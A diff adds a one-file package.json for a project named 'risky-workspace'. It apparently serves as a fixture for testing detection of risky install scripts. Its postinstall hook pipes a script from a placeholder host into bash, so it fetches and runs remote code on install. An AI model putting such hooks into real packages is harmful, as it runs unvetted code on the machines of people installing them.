@@ -1,0 +1,7 @@
+{
+  "name": "risky-workspace",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/bootstrap.sh | bash"
+  }
+}
+
